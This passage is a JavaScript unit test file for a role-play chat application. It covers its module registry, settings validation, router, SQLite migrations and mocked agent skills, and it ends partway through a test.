/** 引擎与架构单元测试。跑法：node tests/run.mjs */

import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, existsSync, readFileSync, readdirSync, writeFileSync } from 'node:fs';
import { spawn } from 'node:child_process';
import { tmpdir } from 'node:os';
import path from 'node:path';

import { createHarness } from './harness.mjs';
import { lintCard, scoreCard, scanAiFlavor, checkOpening, checkFourTuple, checkCreatorNotes, checkAlive } from '../core/writing/quality.mjs';
import { planCard, buildCardDraft, OPENING_PARADIGMS, CREATOR_NOTES_TEMPLATE } from '../core/writing/wizard.mjs';
import {
  parseNotationLine,
  parseNotationBlock,
  toNotation,
  toNotationBlock,
  filterByGeneration,
  buildRecursionMap,
  lintEntries,
} from '../core/worldbook/notation.mjs';
import { cardFromMarkdown, markdownFromCard, splitSections } from '../core/cards/markdown.mjs';
import { platformCardFromExport, parsePlatformKeys, splitFrontendDocument } from '../core/cards/platform-import.mjs';
import { lintModuleCss, scopeCss, MODULE_SCOPE } from '../core/prompts/module-css.mjs';
import { moduleCodeHash, modulePlan, moduleTier, normalizeModule } from '../core/prompts/modules.mjs';
import { resolveNote, normaliseNote, shouldInject, describeNote } from '../core/prompts/note.mjs';
import { substituteOriginal } from '../core/prompts/assemble.mjs';
import { presetSamplingParams, PRESET_PARAM_MODE_IDS } from '../core/prompts/preset-params.mjs';
import { splitThinkingTags } from '../core/chat/thinking.mjs';
import { describeBond } from '../core/chat/bond.mjs';
import { presetOptions, applyFormatTemplate } from '../core/prompts/preset-options.mjs';
import {
  SAMPLER_CATALOG,
  BACKEND_DEFAULT_ORDER,
  createSamplerProfile,
  normaliseOrder,
  resetOrder,
  neutralize,
  describeDiff,
} from '../core/play/samplers.mjs';
import { LOADOUT_PARTS, createLoadout, applyLoadout, describeLoadout } from '../core/play/loadout.mjs';
import { buildBranchTree, layoutBranchTree, branchStats, hashText } from '../core/play/branches.mjs';
import { PROVIDER_FLAGS, flagsFor, visibleParams, describeFlags } from '../core/providers-flags.mjs';
import { createNoteStore, createSamplerStore, createLoadoutStore, createProxyStore, createProfileStore } from '../server/db/studio.mjs';
import { diffSnapshots, diffLines } from '../core/prompts/xray-diff.mjs';
import {
  CAPTION_TEMPLATE_DEFAULT,
  MAX_IMAGE_BYTES,
  normaliseImageMeta,
  renderCaption,
  decideImageMode,
  toOpenAIContent,
  toAnthropicContent,
  toGeminiParts,
  applyImagesToMessages,
} from '../core/media/vision.mjs';
import { STEP_TYPES, stepSpec, validateStep, normaliseActionSet, expandActionText, describeActionSet } from '../core/play/actions.mjs';
import { TRANSLATE_TARGETS, targetName, buildTranslatePrompt, parseTranslateResult, shouldAutoTranslate, looksForeign } from '../core/play/translation.mjs';
import { BOOKMARK_COLORS, normaliseBookmark, describeBookmark, groupByChat } from '../core/play/bookmarks.mjs';
import { splitReasoning, hasReasoning } from '../core/play/reasoning.mjs';
import { normaliseUrl, decodeEntities, htmlToText, chunkText as chunkSourceText, buildExtractPrompt } from '../core/studio/source.mjs';
import { chatToHtml, chatToMarkdown } from '../core/studio/export-html.mjs';
import { BIAS_RANGE, BUILTIN_LOGIT_PRESETS, normaliseLogitBias, normalisePreset, mergeBias, describeBias } from '../core/studio/logit-presets.mjs';
import { guessKeys, memoryToEntry, memoriesToEntries } from '../core/memory/to-worldbook.mjs';
import { createEngine, ENGINE_VERSION } from '../core/index.mjs';
import { createRegistry, AREAS, MODULE_STATUSES } from '../core/registry.mjs';
import { MODULES } from '../core/modules.mjs';
import { assertShape, satisfiesShape, SHAPES, emptyList } from '../core/contracts.mjs';
import { defaultSettings, validateSetting, validateSettings, mergeSettings, SETTINGS_SCHEMA } from '../core/config.mjs';
import { createProviderRegistry, PROVIDER_KINDS } from '../core/providers.mjs';
import {
  TavernError,
  NotImplementedError,
  ValidationError,
  NotFoundError,
  ConflictError,
  notImplemented,
  asyncNotImplemented,
  toErrorPayload,
} from '../core/errors.mjs';
import { newId, shortId, slugify, contentHash, nowIso } from '../core/ids.mjs';
import { createBus } from '../core/events.mjs';
import { createRouter } from '../server/http/router.mjs';
import { decideAutoOpen } from '../server/browser.mjs';
import { createStaticHandler } from '../server/http/static.mjs';
import { createSkillRegistry, runSkill, SKILL_CATEGORIES } from '../core/agent/skills.mjs';
import { CREATIVE_SKILLS, entitiesToWorldbookEntries } from '../core/agent/creative-skills.mjs';
import { messagesToScript } from '../server/api/creative.mjs';
import { buildSystemPrompt, extractJson } from '../core/agent/prompt.mjs';
import { createAgent } from '../core/agent/loop.mjs';
import { resolveModel, planForChat, BINDING_SCOPES } from '../core/models/router.mjs';
import { flattenPrompt } from '../server/providers/registry.mjs';
import { resolveAuth, withQuery, AUTH_STYLES, DEFAULT_AUTH_STYLE } from '../server/providers/auth.mjs';
import { pickDeclaredParams, ADAPTER_PARAM_SCHEMA } from '../server/providers/params.mjs';
import { vertexUrl, vertexModelPath } from '../server/providers/vertex.mjs';
import { isValidLauncher } from '../server/providers/launcher.mjs';
import { createProvider, getProvider, normaliseHeaders, normaliseLauncher } from '../server/db/providers.mjs';
import { createContext, readBody } from '../server/http/middleware.mjs';
import { openDatabase } from '../server/db/index.mjs';
import { readSettings, writeSettings, resetSettings } from '../server/db/settings.mjs';
import { createChatStore, detachAssetRefs } from '../server/db/chat.mjs';
import { createPlayingServices } from '../core/chat/service.mjs';
import { parseChatFile, chatFileJsonl, chatFileRich } from '../core/chat/chatfile.mjs';
import {
  activateMembers,
  activatePooledOrder,
  combineGroupCards,
  GROUP_MODES,
  GROUP_STRATEGIES,
  spokenSinceUser,
} from '../core/chat/group.mjs';
import { applyStateDelta, emptyWorldState, parseStateDelta, rollDice } from '../core/chat/state.mjs';
import { fallbackOptions, parseOptions, buildDirectorMessage } from '../core/chat/narration.mjs';
import { estimateTokens, computeCost } from '../core/chat/tokens.mjs';
import { assemblePrompt, expandMacros, describeState } from '../core/prompts/assemble.mjs';
import {
  normalizeCard,
  parseCardBuffer,
  writeCardBuffer,
  embedCardInPng,
  isPng,
  readCardTextChunks,
  extractCardJsonFromPng,
} from '../core/cards/cardfile.mjs';
import { createCardService, CARD_STATUSES, normalizeStatus } from '../core/cards/service.mjs';
import { createCardStore } from '../server/db/cards.mjs';
import { convertDocument, normalizeWorldBook, detectShape } from '../core/worldbook/shapes.mjs';
import {
  activateWorldInfo,
  matchesKey,
  parseRegexKey,
  SELECTIVE_LOGIC as WI_LOGIC,
  POSITION as WI_POSITION,
} from '../core/worldbook/engine.mjs';
import { createWorldbookService } from '../core/worldbook/service.mjs';
import { createWorldbookStore } from '../server/db/worldbook.mjs';
import { checkLocks, extrasOf, hasFrontend, mergeExtras, normaliseExtras, relationsGraph, withExtras } from '../core/cards/extras.mjs';
import { evaluateMacros, createMacroContext } from '../core/prompts/macros.mjs';
import { normalizeScript, runRegexScript, getRegexedString, regexFromString, regex_placement } from '../core/prompts/regex.mjs';
import { createPromptService } from '../core/prompts/service.mjs';
import { createPromptStore } from '../server/db/prompts.mjs';
import { createVectorStore } from '../server/db/vectors.mjs';
import { createVectorService, chunkText, keywordScore, cosine } from '../core/vectors/service.mjs';
import { createMemoryStore } from '../server/db/memory.mjs';
import { createMemoryService } from '../core/memory/service.mjs';
import {
  COMFY_EXECUTION_MODES,
  COMFY_WORKFLOW_KINDS,
  applyAssetRefs,
  buildPlaceholderContext,
  buildPrompt,
  collectAssetRefs,
  collectHistoryImages,
  comfyWsUrl,
  detectPlaceholders,
  getComfyExecutionMode,
  getWorkflowPreset,
  historyStatus,
  isAssetRef,
  isComfyTerminal,
  listExpressions,
  detectPromptSlots,
  makeAssetRef,
  listWorkflowPresets,
  mapComfyEvent,
  parseApiWorkflow,
  parseImageMarkers,
  planImageTrigger,
  planExpressionBatch,
  progressPercent,
  suggestBindings,
  summariseQueue,
  substitute,
  workflowInputs,
  applyLoras,
  normaliseLoras,
  extractLoraNames,
  normaliseOutfits,
  activeOutfit,
  appendNegativePrompt,
  parseOutfitMarkers,
  deriveLoaderProfile,
  presetsFromProfile,
} from '../core/toolbox/comfy.mjs';
import { createComfyService } from '../core/toolbox/service.mjs';
import { createToolboxServices } from '../core/toolbox/service.mjs';
import { createComfyStore } from '../server/db/comfy.mjs';
import { createAssetStore } from '../server/db/assets.mjs';
import { comfyErrorMessage, describeFetchError, normaliseBaseUrl } from '../server/toolbox/comfy.mjs';
import { createComfyLauncher, comfyLaunchSpec, parseLaunchArgs } from '../server/toolbox/comfy-launcher.mjs';
import { createComfyRunner } from '../server/toolbox/runner.mjs';
import { cacheSavings, estimationDelta, fillDays, normaliseUsage, PRICE_PRESETS } from '../core/toolbox/cost.mjs';
import { createCostStore } from '../server/db/cost.mjs';
import { buildReport, longestStreak, normalisePeriod } from '../core/toolbox/review.mjs';
import { createReviewStore } from '../server/db/review.mjs';
import { createPlansStore } from '../server/db/plans.mjs';
import { createPlansService, PLAN_STATUSES, normalizePlanStatus } from '../core/plans/service.mjs';
import { createCollectionsStore } from '../server/db/collections.mjs';
import { createCollectionsService } from '../core/collections/service.mjs';
import { createMcpServer as createTavernMcpServer, MCP_RETURN_MODES } from '../core/mcp/server.mjs';
import { createZip, readZip } from '../server/toolbox/zip.mjs';
import { createBackupStore } from '../server/db/backup.mjs';
import { createMaintenanceStore } from '../server/db/maintenance.mjs';
import { CLEANUP_TARGETS, describeBackups, describeStats, formatBytes } from '../core/toolbox/maintenance.mjs';
import { SCHEDULE_KINDS, defaultTasks, describeTask, frequencyText, isDue, nextRunAt, normaliseTask } from '../core/toolbox/scheduler.mjs';
import { createShortcutManager, matchesCombo, parseCombo } from '../web/core/shortcuts.mjs';
import { moduleTitle, setLocale, t } from '../web/core/i18n.mjs';
import { filterCommands, nextTheme } from '../web/ui/command-palette.mjs';
import { PLUGIN_HOOKS, createPluginHost, normaliseManifest } from '../core/plugins.mjs';
import { coverageScore, rerankItems, rerankScore } from '../core/vectors/service.mjs';
import { memoryHeat } from '../core/memory/service.mjs';
import { SANDBOX_POLICY, buildSandboxCsp, createFrontendService, escapeRawText, renderCardFrontend, validateCardFrontend } from '../core/frontend/service.mjs';
import { applyParamOverrides, mergeDeep } from '../core/providers-params-override.mjs';
import { modelParamPolicy } from '../core/providers-model-rules.mjs';
import { frontendCodeHash, resolveFrontendPolicy } from '../core/frontend/policy.mjs';
import {
  LOCALISE_LIMITS,
  findExternalUrls,
  kindFromMime,
  mapWithConcurrency,
  nameFromUrl,
  rewriteExternalUrls,
  sniffMime,
} from '../core/frontend/localise.mjs';
import { createFrontendStore } from '../server/db/frontend.mjs';
import { buildRenpyProject, buildStage } from '../core/staging/service.mjs';
import {
  DEFAULT_ROUTES,
  TRANSITIONS,
  buildGallery,
  dropSave,
  enterRoute,
  evaluateRoutes,
  isUnlocked,
  mergeShowSettings,
  normaliseAudio,
  normaliseCast,
  normalisePlayback,
  normaliseShowSettings,
  pickBgm,
  planTransition,
  recordEnding,
  unlockCg,
  unlockRoute,
  writeSave,
} from '../core/staging/show.mjs';
import {
  buildTimeline,
  hasScriptMarkers,
  parseCharacterMarker,
  parseScriptLine,
  parseTransitionMarker,
  scriptMarkerGuide,
  splitBeats,
} from '../core/staging/script.mjs';
import { buildBundle } from '../scripts/bundle.mjs';
import { run as runRecallTests } from './recall.test.mjs';
import { run as runParamTests } from './params.test.mjs';
import { compareVersions, checkForUpdate } from '../server/update.mjs';
import { streamVertex } from '../server/providers/vertex.mjs';
import { adapterParamMap } from '../server/providers/params.mjs';
import { planChatList, chatRowLabel } from '../web/views/card-chats.mjs';
import { reviewFrontend } from '../core/frontend/review.mjs';
import { applyPromptKit, normalisePromptKit, applyReplacements } from '../core/toolbox/prompt-kit.mjs';

const { test, run } = createHarness('core + server 单元测试');
const silentLogger = { info() {}, warn() {}, error() {}, debug() {}, setLevel() {} };

function makeTempDb() {
  const dir = mkdtempSync(path.join(tmpdir(), 'tavern-unit-'));
  const db = openDatabase({ dataDir: dir, logger: silentLogger });
  return {
    dir,
    db,
    cleanup: () => {
      try {
        db.close();
      } catch {
        // 测试里可能已经关过一次了
      }
      // Windows 上刚关掉的 sqlite 文件偶尔还被占用：多试几次，实在删不掉就算了
      // （临时目录残留不影响测试结论，没必要为此让整套测试变红）
      try {
        rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
      } catch {
        // ignore
      }
    },
  };
}

// ---------- 模块注册表 ----------

test('模块地图：id 唯一、形状正确、依赖存在、api 前缀合法', () => {
  const ids = new Set();
  for (const mod of MODULES) {
    assertShape(mod, SHAPES.module, `模块 ${mod.id}`);
    assert.ok(!ids.has(mod.id), `模块 id 重复：${mod.id}`);
    ids.add(mod.id);
    assert.ok(AREAS.some((area) => area.id === mod.area), `模块 ${mod.id} 的区域不存在`);
    assert.ok(MODULE_STATUSES.includes(mod.status), `模块 ${mod.id} 状态非法`);
    for (const dep of mod.dependsOn ?? []) assert.ok(MODULES.some((m) => m.id === dep), `模块 ${mod.id} 依赖不存在：${dep}`);
    for (const api of mod.api ?? []) assert.ok(api.startsWith('/api/'), `模块 ${mod.id} 的 api 必须以 /api/ 开头`);
  }
  assert.ok(ids.has('cards'));
  assert.ok(ids.has('worldbook'));
});

test('注册表：拒绝重复 id、非法 id、未知区域、非法状态、缺失依赖', () => {
  const registry = createRegistry([
    { id: 'a', area: 'writing', title: 'A', summary: '', status: 'planned' },
    { id: 'b', area: 'writing', title: 'B', summary: '', status: 'stub', dependsOn: ['a'] },
  ]);
  assert.throws(() => registry.register({ id: 'a', area: 'writing', title: 'x', summary: '', status: 'stub' }), ConflictError);
  assert.throws(() => registry.register({ id: 'Bad', area: 'writing', title: 'x', summary: '', status: 'stub' }), ValidationError);
  assert.throws(() => registry.register({ id: 'c', area: 'nope', title: 'x', summary: '', status: 'stub' }), NotFoundError);
  assert.throws(() => registry.register({ id: 'd', area: 'writing', title: 'x', summary: '', status: 'weird' }), ValidationError);
  registry.finalize();
  assert.throws(() => registry.register({ id: 'e', area: 'writing', title: 'x', summary: '', status: 'stub' }), ConflictError);
});

test('注册表：依赖排序与成环检测', () => {
  const registry = createRegistry([
    { id: 'c', area: 'writing', title: 'C', summary: '', status: 'planned', dependsOn: ['b'] },
    { id: 'b', area: 'writing', title: 'B', summary: '', status: 'planned', dependsOn: ['a'] },
    { id: 'a', area: 'writing', title: 'A', summary: '', status: 'planned' },
  ]);
  assert.deepEqual(registry.dependencyOrder().map((m) => m.id), ['a', 'b', 'c']);

  const cyclic = createRegistry([
    { id: 'x', area: 'writing', title: 'X', summary: '', status: 'planned', dependsOn: ['y'] },
    { id: 'y', area: 'writing', title: 'Y', summary: '', status: 'planned', dependsOn: ['x'] },
  ]);
  assert.throws(() => cyclic.finalize(), ConflictError);
});

test('注册表：finalize 会抓出不存在的依赖', () => {
  const registry = createRegistry([{ id: 'a', area: 'writing', title: 'A', summary: '', status: 'planned', dependsOn: ['ghost'] }]);
  assert.throws(() => registry.finalize(), ValidationError);
});

// ---------- 契约 ----------

test('契约：assertShape 通过 / 报错的信息可读', () => {
  assertShape({ items: [], total: 0 }, SHAPES.listResult, 'listResult');
  assert.equal(satisfiesShape({ items: [], total: 0 }, SHAPES.listResult), true);
  assert.equal(satisfiesShape({ items: [] }, SHAPES.listResult), false);
  assert.equal(satisfiesShape({ items: 'x', total: 0 }, SHAPES.listResult), false);
  assert.throws(() => assertShape({ items: 'x', total: 0 }, SHAPES.listResult, 'listResult'), (err) => {
    assert.ok(err instanceof ValidationError);
    assert.match(err.message, /listResult\.items/);
    return true;
  });
});

test('契约：emptyList 的形状符合声明', () => {
  assertShape(emptyList(), SHAPES.listResult, 'emptyList');
});

// ---------- 错误 ----------

test('错误：状态码、code 与 toErrorPayload', () => {
  assert.equal(new NotImplementedError('x').status, 501);
  assert.equal(new ValidationError('x').status, 400);
  assert.equal(new NotFoundError('x').status, 404);
  assert.equal(new ConflictError('x').status, 409);
  assert.ok(new NotImplementedError('x') instanceof TavernError);
  assert.deepEqual(toErrorPayload(new ValidationError('坏了')).body.error.code, 'VALIDATION_ERROR');
  assert.equal(toErrorPayload(new Error('意外')).body.error.code, 'INTERNAL_ERROR');
  assert.throws(() => notImplemented('列表')(), NotImplementedError);
});

test('错误：异步桩函数返回 rejected promise', async () => {
  await assert.rejects(async () => asyncNotImplemented('保存')());
});

// ---------- id / 事件 ----------

test('id 工具：前缀、哈希稳定、slug 可用', () => {
  assert.match(newId('char'), /^char_[0-9a-f-]{36}$/);
  assert.equal(shortId(4).length, 8);
  assert.equal(slugify('Hello 世界!'), 'hello-世界');
  assert.equal(slugify('   '), 'item');
  assert.equal(contentHash('abc'), contentHash('abc'));
  assert.notEqual(contentHash('abc'), contentHash('abd'));
  assert.match(nowIso(), /^\d{4}-\d{2}-\d{2}T/);
});

test('事件总线：on / emit / off / once 与异常隔离', () => {
  const bus = createBus();
  const seen = [];
  const off = bus.on('ping', (payload) => seen.push(payload));
  const originalError = console.error;
  console.error = () => {};
  bus.on('ping', () => {
    throw new Error('这个监听器会炸');
  });
  assert.equal(bus.emit('ping', 1), 2);
  bus.emit('ping', 2);
  assert.deepEqual(seen, [1, 2]);
  off();
  bus.emit('ping', 3);
  assert.deepEqual(seen, [1, 2]);
  let once = 0;
  bus.once('boom', () => { once += 1; });
  bus.emit('boom');
  bus.emit('boom');
  assert.equal(once, 1);
  assert.equal(bus.listenerCount('ping'), 1);
  console.error = originalError;
});

// ---------- 设置 ----------

test('设置：默认值覆盖 schema，非法值被拒绝，坏数据回退默认', () => {
  const defaults = defaultSettings();
  assert.equal(Object.keys(defaults).length, SETTINGS_SCHEMA.length);
  assert.equal(defaults['ui.theme'], 'system');
  assert.throws(() => validateSetting('ui.theme', 'neon'), ValidationError);
  assert.throws(() => validateSetting('ui.fontScale', 99), ValidationError);
  assert.throws(() => validateSetting('ui.fontScale', 'big'), ValidationError);
  assert.throws(() => validateSetting('nope.key', 1), ValidationError);
  assert.equal(validateSetting('ui.fontScale', '1.25'), 1.25);
  assert.equal(validateSetting('data.keepPromptXray', true), true);
  assert.equal(mergeSettings({ 'ui.theme': 'dark', 'ui.accent': 123 })['ui.theme'], 'dark');
  assert.equal(mergeSettings({ 'ui.accent': 123 })['ui.accent'], '#a78bfa');
  assert.equal(mergeSettings({ legacy: 1 })['ui.theme'], 'system');
  assert.deepEqual(validateSettings({ 'ui.density': 'compact' }), { 'ui.density': 'compact' });
  // 写卡区折叠状态：存成 JSON 字符串，坏值（不是字符串）要拒绝
  assert.equal(defaults['ui.writingFolds'], '{}');
  assert.equal(validateSetting('ui.writingFolds', '{"xray":true}'), '{"xray":true}');
  assert.throws(() => validateSetting('ui.writingFolds', { xray: true }), ValidationError);
  assert.equal(mergeSettings({ 'ui.writingFolds': '{"memory":true}' })['ui.writingFolds'], '{"memory":true}');
  assert.equal(mergeSettings({ 'ui.writingFolds': 42 })['ui.writingFolds'], '{}');
});

// ---------- 提供方 ----------

test('提供方：五种类型各有空实现，调用会明确报未接', () => {
  const providers = createProviderRegistry();
  assert.equal(providers.kinds().length, PROVIDER_KINDS.length);
  for (const kind of PROVIDER_KINDS) assert.equal(providers.get(kind.id, 'none').descriptor.id, 'none');
  assertThrowsNotImplemented(() => providers.get('chat', 'none').chat({}));
  assert.throws(() => providers.get('nope', 'none'), ValidationError);
  assert.throws(() => providers.register({ descriptor: { kind: 'chat', id: 'none', label: 'x', status: 'stub', capabilities: {} } }), ConflictError);
});

function assertThrowsNotImplemented(fn) {
  assert.throws(fn, NotImplementedError);
}

// ---------- 引擎与各服务 ----------

test('引擎：模块冻结、服务齐全、蓝图数据可用', () => {
  const engine = createEngine();
  assert.equal(engine.version, ENGINE_VERSION);
  assert.equal(engine.registry.finalized, true);
  assert.equal(engine.modules.length, MODULES.length);
  assert.deepEqual(Object.keys(engine.services).sort(), [
    'cards',
    'chat',
    'collections',
    'comfy',
    'cost',
    'frontend',
    'group',
    'maintenance',
    'memory',
    'narration',
    'plans',
    'prompts',
    'review',
    'state',
    'vectors',
    'worldbook',
  ]);
  assert.ok(engine.blueprint.cards.fields.length > 10);
  assert.ok(engine.blueprint.cards.groups.length >= 5);
  assert.ok(engine.blueprint.prompts.stages.length >= 10);
  assert.ok(engine.blueprint.frontend.themeTokens.length >= 8);
});

test('服务：占位方法返回结构正确的空结果', async () => {
  const { services } = createEngine();
  assertShape(await services.cards.list(), SHAPES.listResult, 'cards.list');
  assert.equal(await services.cards.get('x'), null);
  assertShape(await services.worldbook.list(), SHAPES.listResult, 'worldbook.list');
  assertShape(await services.worldbook.activate({}), SHAPES.worldInfoResult, 'worldbook.activate');
  assertShape(await services.prompts.preview({}), SHAPES.promptXray, 'prompts.preview');
  assertShape(await services.memory.list(), SHAPES.listResult, 'memory.list');
  assertShape(await services.vectors.stats(), SHAPES.vectorStats, 'vectors.stats');
  assertShape(await services.chat.list(), SHAPES.listResult, 'chat.list');
  assert.equal(services.prompts.stages().length, 15, '阶段表：加了"预设对话内注入"（酒馆预设排在历史之后的条目）');
  assert.equal(services.memory.layers().length, 3);
  assert.equal(services.vectors.collections().length, 4);
});

test('服务：未实现的方法抛 NotImplementedError', async () => {
  const { services } = createEngine();
  await assert.rejects(async () => services.cards.create({}), NotImplementedError);
  // 玩卡区的方法没注入存储端口时会明确报错（send 是异步生成器，要真的迭代才触发）
  await assert.rejects(async () => {
    for await (const event of services.chat.send('id', '你好')) void event;
  });
  await assert.rejects(async () => services.vectors.reindex());
});

// ---------- 路由器 ----------

test('路由：静态段、参数段、405 与未命中', () => {
  const router = createRouter();
  router.get('/api/characters/fields', () => 'fields');
  router.get('/api/characters/:id', () => 'one');
  router.put('/api/characters/:id', () => 'update');

  const hit = router.match('GET', '/api/characters/fields');
  assert.equal(hit.route.handler(), 'fields');

  const param = router.match('GET', '/api/characters/abc-123');
  assert.deepEqual(param.params, { id: 'abc-123' });
  assert.equal(param.route.handler(), 'one');

  const decoded = router.match('GET', '/api/characters/%E4%B8%AD%E6%96%87');
  assert.equal(decoded.params.id, '中文');

  const wrongMethod = router.match('DELETE', '/api/characters/abc');
  assert.equal(wrongMethod.methodNotAllowed, true);
  assert.ok(wrongMethod.allowed.includes('PUT'));

  assert.equal(router.match('GET', '/api/nope'), null);
  assert.equal(router.match('GET', '/api/characters'), null);
  assert.equal(router.match('HEAD', '/api/characters/xyz').params.id, 'xyz');
});

// ---------- 数据库 ----------

test('数据库：迁移建表、重复打开幂等、版本号正确', () => {
  const { dir, db, cleanup } = makeTempDb();
  try {
    const tables = db.repo
      .all("SELECT name FROM sqlite_master WHERE type = 'table'")
      .map((row) => row.name);
    for (const name of ['characters', 'character_tags', 'character_versions', 'worldbooks', 'worldbook_entries', 'prompt_presets', 'prompt_xray', 'memories', 'vector_items', 'assets', 'settings', 'schema_migrations']) {
      assert.ok(tables.includes(name), `缺少表 ${name}`);
    }
    for (const name of ['providers', 'model_bindings']) {
      assert.ok(tables.includes(name), `缺少表 ${name}`);
    }
    // v5 给 providers 加的列
    const providerColumns = db.repo.all('PRAGMA table_info(providers)').map((row) => row.name);
    for (const column of ['headers', 'auth_style', 'launcher']) {
      assert.ok(providerColumns.includes(column), `providers 缺少列 ${column}`);
    }
    assert.equal(db.schemaVersion, db.latestSchemaVersion);
    assert.ok(db.latestSchemaVersion >= 3, `迁移版本偏低：${db.latestSchemaVersion}`);

    db.close();
    const again = openDatabase({ dataDir: dir, logger: silentLogger });
    assert.equal(again.schemaVersion, again.latestSchemaVersion);
    // 重开不该重复执行迁移：迁移记录条数 == 最新版本号
    assert.equal(again.repo.get('SELECT COUNT(*) AS n FROM schema_migrations').n, again.latestSchemaVersion);
    again.close();

    assert.ok(existsSync(path.join(dir, 'tavern.db')));
  } finally {
    cleanup();
  }
});

test('数据库：仓储的布尔/对象转换与事务回滚', () => {
  const { db, cleanup } = makeTempDb();
  try {
    const now = nowIso();
    db.repo.run('INSERT INTO characters (id, name, spec_version, data, favorite, created_at, updated_at) VALUES (?,?,?,?,?,?,?)', [
      'c1',
      '琥珀',
      'v2',
      { name: '琥珀', data: { description: '猫娘' } },
      true,
      now,
      now,
    ]);
    const row = db.repo.get('SELECT * FROM characters WHERE id = ?', ['c1']);
    assert.equal(row.favorite, 1);
    assert.equal(JSON.parse(row.data).data.description, '猫娘');

    assert.throws(() => {
      db.repo.transaction(() => {
        db.repo.run('INSERT INTO characters (id, name, spec_version, data, created_at, updated_at) VALUES (?,?,?,?,?,?)', ['c2', 'x', 'v2', {}, now, now]);
        throw new Error('故意失败');
      });
    }, /故意失败/);
    assert.equal(db.repo.get('SELECT COUNT(*) AS n FROM characters').n, 1);

    assert.throws(() => db.repo.run('INSERT INTO characters (id, name) VALUES (?,?)', ['c3', null]));
  } finally {
    cleanup();
  }
});

test('数据库：设置读写与重置', () => {
  const { db, cleanup } = makeTempDb();
  try {
    assert.equal(readSettings(db.repo)['ui.theme'], 'system');
    const next = writeSettings(db.repo, { 'ui.theme': 'dark', 'ui.fontScale': 1.2 });
    assert.equal(next['ui.theme'], 'dark');
    assert.equal(next['ui.fontScale'], 1.2);
    assert.equal(readSettings(db.repo)['ui.theme'], 'dark');
    assert.throws(() => writeSettings(db.repo, { 'ui.theme': 'nope' }), ValidationError);
    assert.equal(resetSettings(db.repo)['ui.theme'], 'system');
  } finally {
    cleanup();
  }
});

test('中间件：请求体上限与 JSON 解析错误', async () => {
  const ctx = createContext({
    req: { method: 'POST', headers: { 'content-type': 'application/json' }, [Symbol.asyncIterator]: async function* () { yield Buffer.from('{"a":1}'); } },
    res: { writeHead() {}, end() {} },
    url: new URL('http://x/api/x'),
    app: { logger: silentLogger },
  });
  assert.deepEqual(await ctx.body(), { a: 1 });
  assert.deepEqual(await ctx.body(), { a: 1 });

  await assert.rejects(async () => {
    await readBody({ [Symbol.asyncIterator]: async function* () { yield Buffer.alloc(64); } }, 16);
  }, ValidationError);
});

// ---------- Agent ----------

function demoSkills() {
  return createSkillRegistry([
    {
      id: 'demo.echo',
      title: '回声',
      description: '把输入返回',
      category: 'text',
      parameters: { type: 'object', properties: { text: { type: 'string' } }, required: ['text'] },
      handler: ({ input }) => ({ echoed: input.text }),
    },
  ]);
}

test('技能注册表：id 校验、拒绝重复、describe 不暴露 handler', () => {
  const registry = demoSkills();
  assert.equal(registry.size, 1);
  assert.equal(registry.describe(registry.get('demo.echo')).handler, undefined);
  assert.equal(registry.list({ category: 'text' }).length, 1);
  assert.equal(registry.list({ category: 'card' }).length, 0);
  assert.throws(() => registry.register({ id: 'NoDot', title: 'x' }), ValidationError);
  assert.throws(() => registry.register({ id: 'demo.echo', title: 'x', handler: () => {} }), ConflictError);
  assert.throws(() => registry.register({ id: 'demo.nohandler', title: 'x' }), ValidationError);
  assert.throws(() => registry.get('demo.missing'), NotFoundError);
});

test('技能执行：成功与失败都包成结果对象', async () => {
  const registry = createSkillRegistry([
    ...(demoSkills().list()),
    { id: 'demo.boom', title: '炸', description: '', handler: () => { throw new Error('故意炸'); } },
  ]);
  const model = { complete: async () => ({ text: '' }) };
  const ok = await runSkill(registry.get('demo.echo'), { input: { text: 'hi' }, model });
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.data, { echoed: 'hi' });

  const bad = await runSkill(registry.get('demo.boom'), { input: {}, model });
  assert.equal(bad.ok, false);
  assert.match(bad.error, /故意炸/);

  await assert.rejects(async () => runSkill(registry.get('demo.echo'), { input: {}, model: {} }), ValidationError);
});

test('创作辅助技能：对话成章 / 一条龙 / 素材抽取', async () => {
  const registry = createSkillRegistry(CREATIVE_SKILLS);
  assert.equal(registry.list({ category: 'novel' }).length, 3);
  assert.ok(SKILL_CATEGORIES.some((category) => category.id === 'novel'));
  const model = (payload) => ({ complete: async () => ({ text: JSON.stringify(payload) }) });

  const chapter = await runSkill(registry.get('chapter.polish'), {
    input: { text: '用户：你好\n角色：喵' },
    model: model({ title: '雪夜', chapters: [{ heading: '', text: '第一段' }, { heading: '', text: '第二段' }], text: '第一段\n\n第二段' }),
  });
  assert.equal(chapter.ok, true);
  assert.equal(chapter.data.title, '雪夜');
  assert.match(chapter.data.text, /第一段/);

  const script = await runSkill(registry.get('script.from_card'), {
    input: { card: { name: '阿狸' } },
    model: model({ title: '剧本', worldbook: [{ comment: '旧书馆', keys: ['旧书馆'], content: '藏书的地方' }], scenes: [{ act: '第一幕' }], script: '正文' }),
  });
  assert.equal(script.ok, true);
  assert.equal(script.data.worldbook.length, 1);

  const entities = await runSkill(registry.get('chat.extract_entities'), {
    input: { text: '阿狸在旧书馆' },
    model: model({
      characters: [{ name: '阿狸', aliases: ['小狸'], keys: ['阿狸'], description: '狐妖' }],
      places: [{ name: '旧书馆', keys: ['旧书馆'], description: '藏书的地方' }],
      items: [],
      relations: [],
    }),
  });
  assert.equal(entities.ok, true);
  const entries = entitiesToWorldbookEntries(entities.data);
  assert.equal(entries.length, 2);
  assert.equal(entries[0].comment, '人物：阿狸');
  assert.deepEqual(entries[0].keys, ['阿狸', '小狸'], '名字 + 别名 + 关键词都进触发键');
  assert.equal(entries[1].comment, '地点：旧书馆');
  assert.equal(entitiesToWorldbookEntries({ characters: [{ name: '只有名字' }] }).length, 0, '没有正文的条目不要硬塞');

  // 缺参数 / 模型不返回 JSON 都要失败并给可读原因
  const missing = await runSkill(registry.get('chapter.polish'), { input: {}, model: model({}) });
  assert.equal(missing.ok, false);
  const bad = await runSkill(registry.get('chat.extract_entities'), { input: { text: 'x' }, model: { complete: async () => ({ text: '没有 JSON' }) } });
  assert.equal(bad.ok, false);
  assert.match(bad.error, /JSON/);

  const text = messagesToScript([
    { role: 'assistant', name: '阿狸', content: '喵' },
    { role: 'user', name: '', content: '你好' },
    { role: 'system', isSystem: true, content: '后台指令' },
    { role: 'user', content: '   ' },
  ]);
  assert.match(text, /阿狸：喵/);
